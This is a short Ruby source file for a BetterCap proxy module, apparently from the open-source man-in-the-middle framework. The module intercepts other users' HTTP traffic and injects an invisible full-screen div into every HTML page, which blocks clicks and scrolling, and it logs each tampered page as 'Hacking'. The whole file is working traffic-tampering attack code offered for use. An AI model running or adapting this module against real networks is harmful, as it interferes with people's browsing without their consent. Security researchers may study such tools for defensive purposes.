=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class Noscroll < BetterCap::Proxy::HTTP::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.info "Hacking http://#{request.host}#{request.path}"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '</head>', '</head> <!-- Put an invisible div over everything -->
<div style="position:fixed;width:100%;height:100%;z-index:9001;opacity:0;"></div>' )
    end
  end
end
